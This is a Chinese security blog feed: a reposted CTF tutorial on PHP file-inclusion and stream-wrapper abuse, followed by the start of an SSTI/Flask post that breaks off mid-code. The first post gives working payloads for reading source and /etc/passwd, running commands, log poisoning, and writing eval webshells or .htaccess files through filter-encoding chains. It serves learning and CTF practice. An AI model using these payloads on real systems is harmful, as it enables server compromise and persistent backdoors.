      <url>/2020/12/07/2020-12-07-php-wei-xie-yi-zhuan-zi-my0n9s-da-lao/</url>
      
        <content type="html"><![CDATA[<p>转自Myon9s大佬的博客 <a href="http://myangswhitehat.cn/" target="_blank" rel="noopener">http://myangswhitehat.cn/</a> </p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近一直忙着考试和学校的各种实验，留的学安全的时间比较少，只能零碎时间来总结一下</p><p>之前护网杯的一道Web题涉及到了这一块，一直想抽时间总结了解一下，一直鸽到现在了。</p><p>废话不多说，这次主要是对文件包含以及相关读写函数的一些利用总结，也对相关姿势进行一下梳理。</p><p>如果文档涉及到知识性的错误，欢迎与我来讨论</p><p>联系方式 <code>512615513@qq.com</code></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>你需要了解的：</p><ul><li><p>PHP相关函数</p><ul><li>include</li><li>file_get_content</li><li>file_put_content</li><li>……等等</li><li>附图：</li></ul><p><img src="https://i.loli.net/2020/12/01/giQoUTpsCf8nmKt.png" alt="BK_7E701ZG321YVC7J9MACP.png"></p></li><li><p>PHP伪协议</p><ul><li>php://filter</li><li>data://</li><li>file://</li></ul><p>​     等等</p><p><code>https://www.freebuf.com/column/148886.html</code> 对伪协议的一个讲解文章。</p><p>适用环境附图：</p><p><img src="https://i.loli.net/2020/12/01/qUmjYXn1ItHBxWT.png" alt="123.png"></p></li></ul><h2 id="本地环境测试"><a href="#本地环境测试" class="headerlink" title="本地环境测试"></a>本地环境测试</h2><p>在阿清出的一道反序列化的题目中，使用伪协议发现了问题，发现打不通，然后本地测试了一下</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ceshi</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ceshi'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ceshi</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配合伪协议<code>php://filter</code>，payload为：<code>http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code> 可以读到base64编码后的flag</p><p>如果换成 <code>$_post['ceshi']</code> 呢，答案是一样的。</p><p>改一下源代码：</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ceshi</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ceshi'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$ceshi</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样我们配合 <code>php://filter</code> 伪协议，payload为：<code>http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code> 可以读到base64编码后的flag，换成POST传参形式亦然。</p><p>然后我们再来尝试一下data协议 (这里测试的时候注意更改一下 php.ini 的配置，默认allow_url_include 是 off)</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ceshi</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ceshi'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ceshi</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用data:// 伪协议配合include函数可以执行包含文本内容：</p><p><code>ceshi=data:text/plain,helloworld</code></p><p>![BHKG_M9_ZR_8W4K@6PVUS`I.png](<a href="https://i.loli.net/2020/11/30/gNRqxLoirwlHF5p.png" target="_blank" rel="noopener">https://i.loli.net/2020/11/30/gNRqxLoirwlHF5p.png</a>)</p><p>同样，我们利用data://伪协议配合include函数可以执行PHP语句:</p><p><code>ceshi=data:text/plain,&lt;?php phpinfo();?&gt;</code></p><p>![_V8KVS~VX___1`I_2_7V28P.png](<a href="https://i.loli.net/2020/11/30/kjOEGUcSZxa3iDm.png" target="_blank" rel="noopener">https://i.loli.net/2020/11/30/kjOEGUcSZxa3iDm.png</a>)</p><p>如上图，这里本质上是使用data协议 包含了文本内容，文本内容为 <code>&lt;?php phpinfo();?&gt;</code> 然后被解析成PHP语句执行并返回结果。</p><p>我们尝试一下<code>file_get_contents()</code>函数是不是也支持呢？测试一下：</p><p><img src="https://i.loli.net/2020/11/30/O7R9PwE8FodH3Da.png" alt="J_C4AEA2CN4TNWJ040_O__P.png"></p><p>然后我们尝试一下是不是也能支持PHP命令执行。</p><p><img src="C:%5CUsers%5C86186%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201130165635700.png" alt="image-20201130165635700"></p><p>显然，并不如我们想要的那样。</p><p>为什么会出现这种原因，本质上还是在于对函数功能的理解，这两个函数 include和file_get_contents函数都是支持data伪协议的，这里的data协议用来获取文本数据，然后被include<strong>包含</strong>在当前php文件中，自然而然的就被解析成php代码，而file_get_contents函数只是获取文本的内容，而不是包含，所以没有被解析，从而造成代码执行。</p><p>以上两个函数的本地测试只是想说明:</p><ul><li>存在一部分函数，它们是支持伪协议，并且配合伪协议可以达到一些意想不到的效果。</li><li>同样是支持伪协议，但是不同函数的功能配合伪协议产生的效果也会很不一样。</li></ul><p>接下来对一些函数配合伪协议达到的妙用进行一个小结。</p><h2 id="include-伪协议"><a href="#include-伪协议" class="headerlink" title="include+伪协议"></a>include+伪协议</h2><h3 id="php-filter-read-协议读源码"><a href="#php-filter-read-协议读源码" class="headerlink" title="php://filter/read 协议读源码"></a>php://filter/read 协议读源码</h3><p>姿势：</p><p><code>ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p><code>ceshi=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php</code></p><p>这里的读取出来的编码可以有多种方式（后面看了利用编码写操作就发现多么骚了。），<code>base64、utf-8、utf-16</code>等等，有时候会被过滤，换着绕，另外本地测试发现用这个协议的时候，除了convert那里不能动，其他都可以换成大写小写混着，用这个trick可以绕过一些过滤。</p><h3 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h3><p>可以利用data协议来执行PHP语句:</p><p>姿势：</p><p><code>data://text/plain,&lt;?php system('ls');?&gt;</code> 这里加不加 //都可。</p><p>利用base64编码来绕过</p><p><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+</code>  等效于执行 system(‘ls’);</p><p>本地测试发现，除了data不能动，其他都可以混用大小写来达到绕过的目的。</p><h3 id="include-php-input"><a href="#include-php-input" class="headerlink" title="include+php://input"></a>include+php://input</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ceshi</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ceshi'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ceshi</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>仍然是这个代码，我们可以利用php://input 协议，利用如下：</p><p><code>?ceshi=php://input</code>  然后 post 直接传数据  : <code>&lt;?php system('ls');</code> ，这里POST数据可控。</p><p>不过这里有要求，当编码格式为 <code>enctype="multipart/form-data"</code>  php://input是无效的。</p><p>关于编码格式的解释，贴上一篇博客。</p><p><code>https://blog.csdn.net/lingxiyizhi_ljx/article/details/102514560</code></p><h3 id="include-file协议"><a href="#include-file协议" class="headerlink" title="include+file协议"></a>include+file协议</h3><p>我们这里可以直接用file协议读取本地文件系统的文件，需要使用绝对路径。</p><p><code>?ceshi=file:///etc/passwd</code> ，这里前提是文件可访问。</p><p><strong>大小写这个似乎对PHP的版本有要求，不同的版本有的可以，有的不行。</strong></p><h2 id="include-可控文件"><a href="#include-可控文件" class="headerlink" title="include+可控文件"></a>include+可控文件</h2><p>文件包含的本质是包含一些危险代码，或者是webshell，如果一个文件的内容可控，我们包含之，就可以getshell</p><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>我们在UA头那里包含我们的一句话木马，然后包含日志文件，以nginx为例，日志路径为 /var/log/nginx/access.log </p><p>![V85BD_E14H_XTZP`6K__XON.png](<a href="https://i.loli.net/2020/12/01/NP3yxK8haqInJke.png" target="_blank" rel="noopener">https://i.loli.net/2020/12/01/NP3yxK8haqInJke.png</a>)</p><p> 传过去，然后蚁剑连接，连接路径为 :  <code>https://127.0.0.1/ceshi.php?file=/var/log/nginx/access.log</code></p><h3 id="利用session-upload-progress"><a href="#利用session-upload-progress" class="headerlink" title="利用session.upload_progress"></a>利用session.upload_progress</h3><p>这个思路听说早就有了，但是上上周才接触到，还是学的太少了。</p><p>有一篇文章对 <code>session.upload_progress</code>讲的挺好，这里贴上链接：<code>https://www.freebuf.com/news/202819.html)</code></p><p>简单来说就是上传一个 PHP_SESSION_UPLOAD_PROGRESS 文件，文件内容可以写上我们的shell。然后包含 /tmp/sess_xxx，这里xxx是可控的。然后在利用条件竞争（因为会被删除掉），这里可以直接抓包，利用 intruder模块来进行条件竞争。</p><p>附上一个师傅的上传脚本：</p><pre><code>#poc.php&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action="ip" method="POST" enctype="multipart/form-data"&gt;&lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="2333" /&gt;&lt;input type="file" name="file" /&gt;&lt;input type="submit" value="submit" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php    session_start();?&gt;</code></pre><p>抓包图：(用的师傅的一张。</p><p><img src="https://i.loli.net/2020/12/01/AlEW6mKBDIkzVxg.png" alt="W13K__CM_MV_5V8F_29_VX8.png"></p><p>有时候打不出来，可能是条件竞争没有成功，还没包含就被删掉了，可以考虑线程开大一点。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>include + 伪协议来 getshell ，不局限于这两个文件，只要：</p><ul><li>文件内容可控</li><li>文件可以被访问（也就是可以被包含）</li></ul><p>就可以成功getshell。</p><h2 id="file-get-contents-伪协议"><a href="#file-get-contents-伪协议" class="headerlink" title="file_get_contents + 伪协议"></a>file_get_contents + 伪协议</h2><p>前面的那个本地测试的demo，对 php://filter和data://text 做了说明，其实 file_get_contents还可以结合 php://input</p><p>demo:</p><pre><code>$user = $_GET["txt"];  $file = $_GET["file"];  $pass = $_GET["password"];  if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf")){      echo "hello admin!&lt;br&gt;";      include($file); //hint.php  }else{      echo "you are not admin ! ";  }  </code></pre><p>这里其他不看，单纯来看 <code>(file_get_contents($user,'r')==="welcome to the bugkuctf")</code> 直接传 $user=”welcome xxx” 肯定是不现实的，因为这里是以文件的形式打开，所以我们这里可以尝试 ?user=php://input 然后post数据 welcome to the bugkuctf 即可，post的内容即会被识别为文件内容。</p><h2 id="file-put-content-伪协议"><a href="#file-put-content-伪协议" class="headerlink" title="file_put_content+伪协议"></a>file_put_content+伪协议</h2><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>file_put_contents 结合伪协议来写马，有着很多很骚的操作，其本质也是大同小异，就是利用过滤器编码来做一些操作。关于file_put_contents结合伪协议的考察，之前也遇到过，一直没有做个总结，现总结如下：</p><h3 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"&lt;?php exit();"</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="利用base64"><a href="#利用base64" class="headerlink" title="利用base64"></a>利用base64</h4><p>这个之前在P牛的文章里面有提到过。原文章链接:</p><p><code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></p><p>base64是每4个字符进行编码，这里的 php exit 一共 7个字符，我们需要手动添上一个字符，剩下的就是我们可控代码了。</p><p><code>?filename=php://filter/write/convert.base64-decode/resource=1.php&amp;content=XPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs=</code>  (这里的X是手动添加为了和前面凑8个</p><p><img src="https://i.loli.net/2020/12/02/rXbgw1MVu6jyHKx.png" alt="111.png"></p><h4 id="利用rot13"><a href="#利用rot13" class="headerlink" title="利用rot13"></a>利用rot13</h4><p>一个在线rot13编码解码的网站：</p><p><a href="http://www.mxcz.net/tools/rot13.aspx" target="_blank" rel="noopener">http://www.mxcz.net/tools/rot13.aspx</a></p><p><code>?filename=php://filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG['pzq']);</code></p><p><img src="https://i.loli.net/2020/12/02/tUKJwqIxC61O7s4.png" alt="112.png"></p><p>可以发现成功写入shell，但是有个局限，如果开启了<strong>php短标签</strong>，这个就无效了。就会报错。</p><h4 id="利用string-strip-tags结合-htaccess"><a href="#利用string-strip-tags结合-htaccess" class="headerlink" title="利用string.strip_tags结合.htaccess"></a>利用string.strip_tags结合.htaccess</h4><p>这个可以过滤掉PHP HTML标签  <code>&lt;?php ?&gt;</code> 中内容是可以直接吃完的。</p><p>如果是Apache服务器，我们可以配合<code>.htaccess</code>文件来包含文件:</p><p><code>filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=&gt;php_value%20auto_prepend_file%20D:\phpStudy\PHPTutorial\WWW\flag.php</code></p><p>可以看到成功写入：</p><p><img src="https://i.loli.net/2020/12/02/kBcJiREuFwdAKS3.png" alt="113.png"></p><p>然后访问：</p><p><img src="https://i.loli.net/2020/12/02/UTnmcHASvVEfZqg.png" alt="115.png"></p><p>该方法适用：</p><ul><li>PHP5版本可以，PHP7不行，7.3版本已废除这个标签</li><li>apache环境</li><li>文件名以及路径已知</li></ul><h4 id="过滤器编码组合"><a href="#过滤器编码组合" class="headerlink" title="过滤器编码组合"></a>过滤器编码组合</h4><p>顾名思义，就是利用过滤器的<strong>嵌套</strong>，来实现我们的目的。</p><p>还是针对demo1的代码进行测试：</p><p>我们传入 <code>?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=4.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p><p><img src="https://i.loli.net/2020/12/03/Aqis5nurS2KY9kI.png" alt="1.png"></p><p>可以看到成功写入。</p><p>不过因为  <code>string.strip_tags</code>的原因，这个方法在PHP7版本还是会有局限性，但是在PHP5环境下是适用的。</p><p>另一种方式，针对PHP7环境下：</p><p><code>filename=php://filter/write=zlib.deflate|string.tolower|zlib.inflate/resource=5.php&amp;content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=5.php</code>  </p><p>压缩、转小写、解压，消去死亡exit，成功带入我们的 webshell</p><p><img src="https://i.loli.net/2020/12/03/opFIQ86Nwlgsfzc.png" alt="2.png"></p><p>再来看看demo2 ~</p><h3 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string">"&lt;?php exit();"</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个相较于demo1区别是，同一变量。</p><h4 id="利用base64-1"><a href="#利用base64-1" class="headerlink" title="利用base64"></a>利用base64</h4><p>一开始还是想到使用base64编码：</p><p><code>?content=php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+</code> 拼接后内容就是</p><p><code>&lt;?php exit();php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+</code> 但是没有成功，因为’=’在base64编码中代表结束，所以等号后面还接上字母，会报错，转码不出来。</p><p>所以这里可以结合 <code>string.strip_tags</code> 来去掉等号：</p><p><code>?content=php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php</code></p><p>在windows下，这种文件名的存在是很怪异的，但是在linux下测试是可行的：</p><p><img src="https://i.loli.net/2020/12/03/nm3TNrAQzf5bOEM.png" alt="3.png"></p><p>当然这个方式还是针对于PHP5</p><p><code>?content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;/resource=7.php</code></p><p>这里我们传过去可以看到：</p><p><img src="https://i.loli.net/2020/12/03/mKYV2hBXDQvZrgJ.png" alt="4.png"></p><p>访问 7.php文件，可以看到 phpinfo文件，同理我们可以构造shell</p><h4 id="利用rot13-1"><a href="#利用rot13-1" class="headerlink" title="利用rot13"></a>利用rot13</h4><p>这里我们依然可以利用rot13，<code>?content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=8.php</code> </p><p><img src="https://i.loli.net/2020/12/04/HZ4ScB3Nv81otGu.png" alt="1233.png"></p><p>可以发现，用rot13成功写入，不过仍然存在短标签的问题。</p><h4 id="利用usc-2"><a href="#利用usc-2" class="headerlink" title="利用usc-2"></a>利用usc-2</h4><p>通过usc-2编码，两位一反转。</p><p><code>?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp%20pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=9.php</code></p><p><img src="https://i.loli.net/2020/12/04/P8xZ2qKNeO9Qwob.png" alt="12.png"></p><p>可以看到成功写入，并且将前面的死亡代码糅杂消失。</p><h4 id="利用usc-4"><a href="#利用usc-4" class="headerlink" title="利用usc-4"></a>利用usc-4</h4><p>和usc-2原理基本一致，不过这里是四位一反转。</p><p><code>?content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=10.php</code></p><h4 id="utf-8、utf-7转换"><a href="#utf-8、utf-7转换" class="headerlink" title="utf-8、utf-7转换"></a>utf-8、utf-7转换</h4><p>测试发现：</p><p><img src="https://i.loli.net/2020/12/04/FZmGyCQb5MfnAvO.png" alt="13.png"></p><p>等号经过<code>utf-7</code>编码后会变成 +AD0- ，这样就可以消除等号的影响。并且：</p><p><img src="https://i.loli.net/2020/12/04/uWVSQyApnEH58hF.png" alt="14.png"></p><p>纯字符经过 <code>utf-7</code> 编码 ，和原来不会有太大区别，所以可以结合 utf7和base64解码来写马</p><p><code>?content=php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=10.php</code></p><p>本地可以看到已经成功写入：</p><p><img src="https://i.loli.net/2020/12/06/CYKxaU7HFZM2diz.png" alt="123.png"></p><h3 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span> <span class="token punctuation">.</span> <span class="token string">"\nxxxxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实可以直接写 <code>?content=&lt;?php phpinfo();?&gt;</code> 但其实题目一般都会有过滤，可能是过滤掉 起始符号 &lt;? ，这个时候我们可以利用 <code>.htaccess</code></p><p>但是 <code>.htaccess</code> 文件，对内容要求很严格，多余冗杂的代码会导致文件失效和错误。所以我们考虑注释符。</p><p>s1mple师傅的payload:</p><p><code>?filename=.htaccess&amp;content=php_value%20auto_prepend_file%20D:\phpStudy\PHPTutorial\WWW\flag.php%0a%23\</code></p><p>我自己本地测试发现，在windows下不能使那个换行无效…，而在linux下似乎也不可行。后面有人如果能复现或者自己有思路可以绕过去的，欢迎与我讨论~</p><p>参考链接：</p><p><code>https://xz.aliyun.com/t/8163#toc-2</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-12-07-SSTI模板注入与Flask基础（略带沙箱逃逸）</title>
      <link href="/2020/12/07/2020-12-07-ssti-mo-ban-zhu-ru-yu-flask-ji-chu/"/>
      <url>/2020/12/07/2020-12-07-ssti-mo-ban-zhu-ru-yu-flask-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI模板注入与Flask基础"><a href="#SSTI模板注入与Flask基础" class="headerlink" title="SSTI模板注入与Flask基础"></a>SSTI模板注入与Flask基础</h1><h3 id="Flask简介"><a href="#Flask简介" class="headerlink" title="Flask简介"></a>Flask简介</h3><p>Flask是一个Python上的<strong>Web应用程序框架</strong>（Web Application Framework）。</p><p><strong>Web应用程序框架</strong>是一个库和模块的集合，使Web应用程序开发人员能够编写Web应用程序，而不必担心协议，线程管理等低级细节。</p><p>Flask基于<strong>Werkzeug WSGI</strong>工具包和<strong>Jinja2</strong>模板引擎。</p><blockquote><h5 id="Werkzeug"><a href="#Werkzeug" class="headerlink" title="Werkzeug"></a>Werkzeug</h5><p>它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。</p><h5 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h5><p>jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。</p><p>Flask通常被称为微框架。 它旨在保持应用程序的核心简单且可扩展。Flask没有用于数据库处理的内置抽象层，也没有形成验证支持。相反，Flask支持扩展以向应用程序添加此类功能。</p></blockquote><p><strong>Jinjia模板引擎特点</strong></p><p><img src="/img/jinja2%E8%AF%AD%E6%B3%95.png" alt="img"></p><p><strong>控制语句</strong></p><p><img src="/img/image-20201222222445589.png" alt="image-20201222222445589"></p><p> <strong>注意：不可以使用<code>continue</code>和<code>break</code>表达式来控制循环的执行。</strong></p><p><strong>过滤器</strong></p><p>过滤器是通过（<code>|</code>）符号进行使用的，例如：<code>0：</code>将返回name的长度。</p><p>过滤器相当于是一个函数，把当前的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值，之后再将结果渲染到页面中。</p><h2 id="SSTi漏洞的产生"><a href="#SSTi漏洞的产生" class="headerlink" title="SSTi漏洞的产生"></a>SSTi漏洞的产生</h2><p>ssti漏洞产生于网页模板中的变量被二次渲染时。</p><p>什么是二次渲染，这里用两个例子简单展示：</p><p>无二次渲染：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    str<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span>    html<span class="token operator">=</span><span class="token string">'&lt;h1>Welcome&lt;/h1>&lt;/br>&lt;p>{{str}}&lt;/p>'</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html<span class="token punctuation">,</span>str<span class="token operator">=</span>str<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有二次渲染行为：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    str<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span>    html<span class="token operator">=</span><span class="token string">"&lt;h1>Welcome&lt;/h1>&lt;/br>&lt;p>%s&lt;/p>"</span><span class="token operator">%</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果在页面中找到了这样一个ssti漏洞，便意味着我们能够在这个注入点执行该模板引擎的控制语句以及命令</p><p>Flask SSTI 题的基本思路就是利用 python 中的 <strong>魔术方法</strong> 找到自己要用的函数。</p><pre><code>__dict__：保存类实例或对象实例的属性变量键值对字典__class__：返回调用的参数类型__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __base__: 返回该对象所继承的基类__bases__：返回该对象所继承的类型列表__subclasses__：以一个列表的形式返回对象的子类__init__：类的初始化方法__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</code></pre><p>基本步骤：</p><p>使用魔术方法进行函数解析，再获取基本类：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>request<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span 